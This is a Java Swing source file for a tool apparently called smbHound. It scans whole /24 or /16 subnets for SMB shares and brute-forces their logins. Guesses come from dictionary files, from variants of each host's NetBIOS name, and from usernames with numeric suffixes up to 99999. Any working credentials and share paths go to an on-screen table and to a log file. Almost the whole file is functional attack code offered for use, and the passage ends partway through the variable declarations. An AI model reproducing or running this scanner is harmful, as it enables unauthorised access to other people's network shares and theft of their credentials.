/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package smbhound;

import java.awt.MouseInfo;
import java.awt.Point;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.SwingUtilities;
import javax.swing.table.DefaultTableModel;
import javax.swing.text.BadLocationException;
import jcifs.netbios.NbtAddress;
import jcifs.smb.NtlmPasswordAuthentication;
import jcifs.smb.SmbAuthException;
import jcifs.smb.SmbFile;

/**
 *
 * @author akiel
 */
public class smbHoundFrame extends javax.swing.JFrame {

    public static ArrayList<String> users;
    public static ArrayList<String> passwords;
    private static ExecutorService pool;

    private static String[] data = new String[7];
    protected static DefaultTableModel model;
    private static JTable tabla;

    /**
     * Creates new form smbHoundFrame
     */
    public smbHoundFrame() {
        //theTable = new DefaultTableModel(0, 1);
        initComponents();
        setLocationRelativeTo(null);
        jTable1.getColumn("").setCellRenderer(new HTableCellRenderer());
        jTable1.getColumn("").setCellEditor(new ButtonEditor(new JCheckBox()));
        try {
            range.setText(IpTools.prefixes().get(0));
        } catch (Exception ex) {
            Logger.getLogger(smbHoundFrame.class.getName()).log(Level.SEVERE, null, ex);
        }

        Timer timer = new Timer();
        timer.schedule(new Segundero(), 0, 1000);
    }

    class Segundero extends TimerTask {

        public void run() {
            Date horaActual = new Date();
            SimpleDateFormat formatoHora = new SimpleDateFormat("hh:mm");
            String cadenaHora = formatoHora.format(horaActual);
            jLabel3.setText(cadenaHora);
        }
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jSplitPane1 = new javax.swing.JSplitPane();
        jPanel1 = new javax.swing.JPanel();
        jPanel2 = new javax.swing.JPanel();
        range = new javax.swing.JTextField();
        poolTop = new javax.swing.JSpinner();
        jLabel1 = new javax.swing.JLabel();
        jPanel3 = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();
        log = new javax.swing.JTextArea();
        jScrollPane3 = new javax.swing.JScrollPane();
        jTable1 = new javax.swing.JTable();
        jLabel6 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        pauseButton = new javax.swing.JLabel();
        thread_count = new javax.swing.JLabel();
        jProgressBar1 = new javax.swing.JProgressBar();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Hound");
        setMinimumSize(new java.awt.Dimension(640, 480));
        setUndecorated(true);
        setResizable(false);
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowOpened(java.awt.event.WindowEvent evt) {
                formWindowOpened(evt);
            }
        });

        jPanel1.setBackground(new java.awt.Color(42, 54, 177));
        jPanel1.setMaximumSize(new java.awt.Dimension(640, 480));
        jPanel1.setMinimumSize(new java.awt.Dimension(640, 480));
        jPanel1.setPreferredSize(new java.awt.Dimension(640, 480));
        jPanel1.addMouseMotionListener(new java.awt.event.MouseMotionAdapter() {
            public void mouseDragged(java.awt.event.MouseEvent evt) {
                jPanel1MouseDragged(evt);
            }
        });
        jPanel1.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                jPanel1MousePressed(evt);
            }
        });

        jPanel2.setBackground(new java.awt.Color(86, 119, 252));

        range.setColumns(9);
        range.setFont(new java.awt.Font("Roboto", 0, 11)); // NOI18N
        range.setBorder(javax.swing.BorderFactory.createEmptyBorder(1, 8, 2, 2));
        range.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                rangeActionPerformed(evt);
            }
        });
        range.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyTyped(java.awt.event.KeyEvent evt) {
                rangeKeyTyped(evt);
            }
        });

        poolTop.setFont(new java.awt.Font("Roboto", 0, 11)); // NOI18N
        poolTop.setModel(new javax.swing.SpinnerNumberModel(200, 5, 1000, 50));
        poolTop.setBorder(javax.swing.BorderFactory.createEmptyBorder(1, 1, 1, 1));
        poolTop.setEditor(new javax.swing.JSpinner.NumberEditor(poolTop, ""));
        poolTop.setFocusable(false);
        poolTop.setOpaque(false);
        poolTop.setPreferredSize(new java.awt.Dimension(69, 25));
        poolTop.setRequestFocusEnabled(false);

        jLabel1.setBackground(new java.awt.Color(0, 0, 255));
        jLabel1.setForeground(new java.awt.Color(153, 204, 0));
        jLabel1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/smbhound/ic_search_white_24dp.png"))); // NOI18N
        jLabel1.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                jLabel1MousePressed(evt);
            }
        });

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addGap(9, 9, 9)
                .addComponent(range)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(poolTop, javax.swing.GroupLayout.PREFERRED_SIZE, 68, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jLabel1)
                .addGap(9, 9, 9))
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addGap(9, 9, 9)
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(range, javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(poolTop, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(0, 0, Short.MAX_VALUE)
                        .addComponent(jLabel1)))
                .addGap(9, 9, 9))
        );

        jPanel3.setBackground(new java.awt.Color(231, 233, 253));
        jPanel3.setForeground(new java.awt.Color(224, 242, 241));

        log.setEditable(false);
        log.setColumns(20);
        log.setFont(new java.awt.Font("Roboto", 0, 13)); // NOI18N
        log.setRows(5);
        log.setBorder(null);
        log.setMargin(new java.awt.Insets(4, 4, 4, 4));
        jScrollPane1.setViewportView(log);

        jTable1.setFont(new java.awt.Font("Roboto", 0, 12)); // NOI18N
        jTable1.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Path", "User", "Pass", ""
            }
        ) {
            Class[] types = new Class [] {
                java.lang.String.class, java.lang.String.class, java.lang.String.class, java.lang.Object.class
            };

            public Class getColumnClass(int columnIndex) {
                return types [columnIndex];
            }
        });
        jTable1.setGridColor(new java.awt.Color(255, 255, 255));
        jScrollPane3.setViewportView(jTable1);
        if (jTable1.getColumnModel().getColumnCount() > 0) {
            jTable1.getColumnModel().getColumn(0).setMinWidth(300);
            jTable1.getColumnModel().getColumn(3).setMinWidth(20);
            jTable1.getColumnModel().getColumn(3).setMaxWidth(20);
        }

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 614, Short.MAX_VALUE)
                    .addComponent(jScrollPane1))
                .addContainerGap())
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 235, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 110, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jLabel6.setFont(new java.awt.Font("Roboto", 1, 14)); // NOI18N
        jLabel6.setForeground(new java.awt.Color(255, 255, 255));
        jLabel6.setText("X");
        jLabel6.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jLabel6MouseClicked(evt);
            }
        });

        jLabel7.setFont(new java.awt.Font("Roboto", 1, 12)); // NOI18N
        jLabel7.setForeground(new java.awt.Color(255, 255, 255));

        jLabel3.setFont(new java.awt.Font("Roboto", 1, 12)); // NOI18N
        jLabel3.setForeground(new java.awt.Color(255, 255, 255));
        jLabel3.setText("00:00");

        pauseButton.setFont(new java.awt.Font("Roboto", 1, 12)); // NOI18N
        pauseButton.setForeground(new java.awt.Color(255, 255, 255));
        pauseButton.setIcon(new javax.swing.ImageIcon(getClass().getResource("/smbhound/ic_pause_circle_fill_white_24dp.png"))); // NOI18N
        pauseButton.setEnabled(false);
        pauseButton.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                pauseButtonMousePressed(evt);
            }
        });

        thread_count.setFont(new java.awt.Font("Roboto", 0, 12)); // NOI18N
        thread_count.setForeground(new java.awt.Color(255, 255, 255));
        thread_count.setText("0/0");

        jProgressBar1.setStringPainted(true);

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel3, javax.swing.GroupLayout.PREFERRED_SIZE, 119, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(170, 170, 170)
                .addComponent(jLabel7)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(jLabel6)
                .addContainerGap())
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addGap(299, 299, 299)
                .addComponent(pauseButton)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 97, Short.MAX_VALUE)
                .addComponent(jProgressBar1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(29, 29, 29)
                .addComponent(thread_count)
                .addGap(24, 24, 24))
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                .addGap(3, 3, 3)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addGap(3, 3, 3))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jLabel6)
                    .addComponent(jLabel7))
                .addGap(3, 3, 3)
                .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(0, 0, 0)
                .addComponent(jPanel3, javax.swing.GroupLayout.PREFERRED_SIZE, 376, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(pauseButton)
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGap(3, 3, 3)
                        .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(thread_count)
                            .addComponent(jProgressBar1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addGap(19, 19, 19))
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void formWindowOpened(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowOpened
        // TODO add your handling code here:

    }//GEN-LAST:event_formWindowOpened

    private void jPanel1MousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jPanel1MousePressed
        // TODO add your handling code here:
        x = evt.getX();
        y = evt.getY();
    }//GEN-LAST:event_jPanel1MousePressed

    private void jPanel1MouseDragged(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jPanel1MouseDragged
        // TODO add your handling code here:
        Point ubicacion = MouseInfo.getPointerInfo().getLocation();//1
        setLocation(ubicacion.x - x, ubicacion.y - y);//3
    }//GEN-LAST:event_jPanel1MouseDragged

    private void jLabel6MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel6MouseClicked

        System.exit(0);
    }//GEN-LAST:event_jLabel6MouseClicked

    private void search() {
        if (jLabel1.isEnabled()) {

            DefaultTableModel tm = (DefaultTableModel) jTable1.getModel();
            while (tm.getRowCount() > 0) {
                tm.removeRow(0);
            }

            initialize();
            //    jTable1.
            jLabel7.setText(range.getText());
            if ((!range.getText().matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) && (!range.getText().matches("\\d{1,3}\\.\\d{1,3}"))) {
                log.append("invalid range!\n");
                log.append("try: 192.168.1 to scan 192.168.1.0/24 or 192.168 to scan 192.168.0.0/16\n");
            } else {
                range.setEnabled(false);
                pauseButton.setEnabled(true);
                jLabel1.setEnabled(false);
                jLabel1.setFocusable(false);
                poolTop.setEnabled(false);
                pool = Executors.newFixedThreadPool((int) poolTop.getValue());
                log.append("working with " + poolTop.getValue() + " threads\n");
                String prefix = range.getText();
                Thread t = new Thread(new Runnable() {

                    @Override
                    public void run() {
                        while (true) {
                            jProgressBar1.setMinimum(0);
                            jProgressBar1.setMaximum((int) ((ThreadPoolExecutor) pool).getTaskCount());
                            jProgressBar1.setValue((int) ((ThreadPoolExecutor) pool).getCompletedTaskCount());

                            if ((int) ((ThreadPoolExecutor) pool).getTaskCount() == (int) ((ThreadPoolExecutor) pool).getCompletedTaskCount()) {
                                pool.shutdownNow();
                            }

                            String active = String.valueOf(((ThreadPoolExecutor) pool).getActiveCount());
                            if (pool.isShutdown()) {
                                range.setEnabled(true);
                                jLabel1.setEnabled(true);
                                jLabel1.setFocusable(true);
                                poolTop.setEnabled(true);
                                pauseButton.setEnabled(false);
                            } else {
                                range.setEnabled(false);
                                jLabel1.setEnabled(false);
                                jLabel1.setFocusable(false);
                                poolTop.setEnabled(false);
                                pauseButton.setEnabled(true);
                            }
                            thread_count.setText(active + "/" + String.valueOf(poolTop.getValue()));
                            try {
                                Thread.sleep(300);
                            } catch (InterruptedException ex) {
                                Logger.getLogger(smbHoundFrame.class.getName()).log(Level.SEVERE, null, ex);
                            }
                        }
                    }
                });

                if (range.getText().matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) {
                    log.append("starting scan for subnet " + range.getText() + ".0/24\n");
                    //log.append("...................................................................................................................");
                    System.out.println("[ :)] starting scan for subnet " + range.getText() + ".0/24");
                    for (int i = 1; i < 254; i++) {
                        String ip = prefix + "." + String.valueOf(i);

                        //  Thread a = new Thread(new activator(ip, log));
                        Thread a = new Thread(new activator(ip, log, jTable1));
                        pool.execute(a);
                    }
//                    
//                    pool.execute(a);
//                }

                } else if (range.getText().matches("\\d{1,3}\\.\\d{1,3}")) {
                    log.append("starting scan for subnet " + range.getText() + ".0.0/16\n");
                    System.out.println("[ :)] starting scan for subnet " + range.getText() + ".0.0/16");
                    for (int i = 1; i < 254; i++) {
                        for (int j = 1; j < 254; j++) {
                            String ip = prefix + "." + String.valueOf(i) + "." + String.valueOf(j);

                            // Thread a = new Thread(new activator(ip, log));
                            Thread a = new Thread(new activator(ip, log, jTable1));
                            pool.execute(a);
                        }
                    }

                }
                t.start();

            }
        }
    }

    private void jLabel1MousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel1MousePressed
        // TODO add your handling code here:
        search();
    }//GEN-LAST:event_jLabel1MousePressed

    private void rangeActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_rangeActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_rangeActionPerformed

    private void pauseButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_pauseButtonMousePressed
        // TODO add your handling code here:
        if (pauseButton.isEnabled()) {
            pool.shutdownNow();
            range.setEnabled(true);
            poolTop.setEnabled(true);
            jLabel1.setEnabled(true);
            jLabel1.setFocusable(true);
            pauseButton.setEnabled(false);
        }
    }//GEN-LAST:event_pauseButtonMousePressed

    private void rangeKeyTyped(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_rangeKeyTyped
        // TODO add your handling code here:
        if (evt.getKeyChar() == 10) {
            search();
        }
    }//GEN-LAST:event_rangeKeyTyped

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
//        try {
//            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
//                if ("Nimbus".equals(info.getName())) {
//                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
//                    break;
//                }
//            }
//        } catch (ClassNotFoundException ex) {
//            java.util.logging.Logger.getLogger(smbHoundFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
//        } catch (InstantiationException ex) {
//            java.util.logging.Logger.getLogger(smbHoundFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
//        } catch (IllegalAccessException ex) {
//            java.util.logging.Logger.getLogger(smbHoundFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
//        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
//            java.util.logging.Logger.getLogger(smbHoundFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
//        }
        //</editor-fold>

        if (args.length > 0) {
            if (args[0].equals("-cli")) {

            }
        } else {

            /* Create and display the form */
            java.awt.EventQueue.invokeLater(new Runnable() {
                public void run() {
                    new smbHoundFrame().setVisible(false);
                    new login().setVisible(true);
                }
            });
        }
    }

    public void initialize() {
        users = new ArrayList();
        passwords = new ArrayList();
//        CartesianProduct.genNumbersCache();
        try {
            Scanner sc = new Scanner(new File("users.list"));
            while (sc.hasNext()) {
                users.add(sc.next());
            }
        } catch (FileNotFoundException ex) {
            log.append("[ :(] users.list not found\n");
            System.err.println("[ :(] users.list not found");
//            System.exit(1);
        }
        try {
            Scanner sc = new Scanner(new File("passwords.list"));
            while (sc.hasNext()) {
                passwords.add(sc.next());
            }
        } catch (FileNotFoundException ex) {
            log.append("[ :(] passowrds.list not found\n");
            System.err.println("[ :(] passowrds.list not found");
//            System.exit(1);
        }
        log.append("found " + String.valueOf(users.size()) + " users and " + String.valueOf(passwords.size()) + " passwords making " + String.valueOf(users.size() * passwords.size()) + " combinations to analize\n");
        log.append("done reading dictionary files\n");
        System.out.println("[¬_¬] found " + String.valueOf(users.size()) + " users and " + String.valueOf(passwords.size()) + " passwords making " + String.valueOf(users.size() * passwords.size()) + " combinations to analize");
        System.out.println("[ :)] done reading dictionary files");
    }

    private static class activator
            implements Runnable {

        private final String ip;
        private boolean onerror;
        String[] posfixes = {"-", "_", "--", "__"};
        private final JTextArea theLog;
        private final JTable table;

        public activator(String ip, JTextArea log, JTable table) {
            this.ip = ip;
            this.theLog = log;
            this.table = table;
            this.onerror = false;
        }

        @Override
        public void run() {
//            logArea("starting "+ip);
            active();
            if ((!this.onerror)) {
                boolean found = false;
                boolean noname = false;
                ArrayList<String> usrs = new ArrayList();
                String s = "";
                try {
                    s = NbtAddress.getAllByAddress(this.ip)[0].getHostName().toLowerCase();
                    logArea(new StringBuilder().append("[^_^] ").append(this.ip).append(" also named ").append(s).append(" detected active but not open. Dictionary test working.").toString());
                    System.out.println(new StringBuilder().append("[^_^] ").append(this.ip).append(" also named ").append(s).append(" detected active but not open. Dictionary test working.").toString());

                    for (String i : this.posfixes) {
                        if (s.contains(i)) {
                            usrs.add(s.substring(0, s.lastIndexOf(i)));
                            break;
                        }
                    }

                    for (String i : this.posfixes) {
                        if (s.contains(i)) {
                            usrs.add(s.substring(s.indexOf(i) + 1, s.length()));
                            break;
                        }
                    }

                    usrs.add(s);

                    for (String i : usrs) {
                        if ((found) || (this.onerror)) {
                            break;
                        }
                        for (String j : usrs) {
                            if ((found) || (this.onerror)) {
                                break;
                            }

                            if (active(i, j)) {
                                found = true;
                                break;
                            }
                        }
                    }

                    if (!found) {
                        logArea("[:(]" + ip + " also named " + s + " passed genusr = genusr test");
                    }

                    for (String i : usrs) {
                        if ((found) || (this.onerror)) {
                            break;
                        }
                        if ((active(i, reverse(i))) || (active(i, firstCap(i)))) {
                            found = true;
                        }
                    }

                    if (!found) {
                        logArea("[:(]" + ip + " also named " + s + " passed genusr = reverse(genusr) test");
                    }

                    for (String i : usrs) {
                        if ((found) || (this.onerror)) {
                            break;
                        }
                        for (String j : passwords) {
                            if ((found) || (this.onerror)) {
                                break;
                            }
                            if (active(i, j)) {
                                found = true;
                                break;
                            }
                        }
                    }

                    if (!found) {
                        logArea("[:(]" + ip + " also named " + s + " passed genusr = password test");
                    }

                } catch (Exception ex) {
                    noname = true;
                }

                if (noname) {
                    logArea(new StringBuilder().append("[^_^] ").append(this.ip).append(" detected active but not open. Dictionary test working.").toString());
                    System.out.println(new StringBuilder().append("[^_^] ").append(this.ip).append(" detected active but not open. Dictionary test working.").toString());
                }

                for (String i : users) {
                    if ((found) || (this.onerror)) {
                        break;
                    }
                    for (String j : passwords) {
                        if ((found) || (this.onerror)) {
                            break;
                        }
                        if (active(i, j)) {
                            found = true;
                            break;
                        }
                    }
                }

                if (!found) {
                    logArea("[:(]" + ip + " passed user = password test");
                }

                if (!noname) {
                    for (String i : usrs) {
                        if ((found) || (this.onerror)) {
                            break;
                        }
                        for (int j = 1; j <= 5; j++) {
                            if ((found) || (this.onerror)) {
                                break;
                            }
                            try {
                                //                            logArea("generating CartesianProduct for size "+j+" on "+usrs.size()+" users");
//                                for (String cart : CartesianProduct.getCachedNumbers(j)) {
                                for (int cart = 0; cart <= 99999; cart++) {
                                    if (active(i, i + String.valueOf(cart))) {
                                        found = true;
                                        break;
                                    }
                                }
                            } catch (Exception ex) {
                                Logger.getLogger(smbHoundFrame.class.getName()).log(Level.SEVERE, null, ex);
                            }
                        }
                    }

                    if (!found) {
                        logArea("[:(]" + ip + " also named " + s + " passed genusr = genusr+#{1..5} test");
                    }
                }

//esto es demasiado
//habilitar solo en modo stalker fula
//                for (String i : users) {
//                        if ((found) || (this.onerror)) {
//                            break;
//                        }
//                        for (int j = 1; j <= 5; j++) {
//                            if ((found) || (this.onerror)) {
//                                break;
//                            }
//                            for (String cart : CartesianProduct.genNumbers(j)) {
//                                if (active(i, i+cart)) {
//                                    found = true;
//                                    break;
//                                }
//                            }
//                        }
//                    }
//                   if (!found){
//                        logArea("[:(]"+ip+" passed user = user+#{1..5} test");
//                    }
                if (!found) {
                    logArea(new StringBuilder().append("[ :(] ").append(this.ip).append(" resisted attack").toString());
                    System.out.println(new StringBuilder().append("[ :(] ").append(this.ip).append(" resisted attack").toString());
                }
            }
        }

        private String reverse(String s) {
            StringBuilder result = new StringBuilder();
            char[] arr$ = s.toCharArray();
            int len$ = arr$.length;
            for (int i$ = 0; i$ < len$; i$++) {
                Character c = Character.valueOf(arr$[i$]);
                result.insert(0, c);
            }
            return result.toString();
        }

        private String firstCap(String s) {
            return new StringBuilder().append(String.valueOf(s.charAt(0)).toUpperCase()).append(s.substring(1)).toString();
        }

        private synchronized void log(String str) throws IOException {
            FileWriter log = new FileWriter(new File("foundLog.log").getAbsoluteFile(), true);
            log.write(new StringBuilder().append(str).append("\n").toString());
            log.close();
        }

        private synchronized void logArea(final String str) {
            Runnable runnable = new Runnable() {
                public void run() {
                    theLog.append(str);
                    theLog.append("\n");
                    if (theLog.getDocument().getLength() > 50000) {
                        try {
                            theLog.getDocument().remove(0, 5000);
                        } catch (BadLocationException e) {
//                        log.error("Can't clean log", e);
                        }
                    }
                    theLog.setCaretPosition(theLog.getDocument().getLength());
                }
            };
            SwingUtilities.invokeLater(runnable);
        }

        private synchronized void logTable(final String ruta, final String usuario, final String contrasena) {
            DefaultTableModel tm = (DefaultTableModel) table.getModel();
            Vector<Object> datos = new Vector<>();
            datos.add(ruta);
            datos.add(usuario);
            datos.add(contrasena);
            datos.add("Copy");
            tm.addRow(datos);
        }

        private boolean onWindows() {
            String OS = System.getProperty("os.name").toLowerCase();
            if (OS.contains("win")) {
                return true;
            }
            return false;
        }

        private boolean active() {
            try {
                SmbFile f = new SmbFile("smb://" + this.ip);
                f.connect();
//                System.out.println("[ :D]> smb://" + this.ip);
//                log("smb://" + this.ip);
                for (SmbFile i : f.listFiles()) {
                    try {
                        if (!i.getName().equals("IPC$/")) {
                            i.connect();
                            logArea(" smb://" + this.ip + "/" + i.getName());
                            // 
                            if (onWindows()) {
                                logTable("\\\\" + this.ip + "\\" + i.getName().replace("/", "\\"), "-", "-");
                            } else {
                                logTable("smb://" + this.ip + "/" + i.getName(), "-", "-");
                            }
                            System.out.println("[ :D]> smb://" + this.ip + "/" + i.getName());
                            log("smb://" + this.ip + "/" + i.getName());
                        }
                    } catch (jcifs.smb.SmbAuthException ex) {
                        //  Thread a = new Thread(new activator(this.ip + "/" + i.getName(), theLog));
                        Thread a = new Thread(new activator(this.ip + "/" + i.getName(), theLog, table));
                        pool.execute(a);
//                        System.out.println("running activator for "+this.ip + "/" + i.getName());
                    }
                }

                return true;
            } catch (SmbAuthException aex) {
            } catch (IOException ex) {
//                System.out.println(ex.getMessage());
                this.onerror = true;
                return false;
            }

            return false;
        }

        private boolean active(String user, String pass) {
            try {
                SmbFile f = new SmbFile("smb://" + this.ip, new NtlmPasswordAuthentication("", user, pass));
                f.connect();
//                System.out.println("[ :D]> " + user + " <-> " + pass + " <-> smb://" + this.ip);
//                log(user + " <-> " + pass + " <-> smb://" + this.ip);
                for (SmbFile i : f.listFiles()) {
                    try {
                        if (!i.getName().equals("IPC$/")) {
                            i.connect();

                            logArea(" smb://" + user + ":" + pass + "@" + this.ip + "/" + i.getName());
                            if (onWindows()) {
                                logTable("\\\\" + this.ip + "\\" + i.getName().replace("/", "\\"), user, pass);
                            } else {
                                logTable("smb://" + user + ":" + pass + "@" + this.ip + "/" + i.getName(), user, pass);
                            }
                            System.out.println("[ :D]> smb://" + user + ":" + pass + "@" + this.ip + "/" + i.getName());
                            log("[ :D]> smb://" + user + ":" + pass + "@" + this.ip + "/" + i.getName());
                        }
                    } catch (jcifs.smb.SmbAuthException ex) {
                    }
                }
                return true;
            } catch (SmbAuthException aex) {
            } catch (IOException ex) {
                this.onerror = true;
                return false;
            }
            return false;
        }
    }


    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
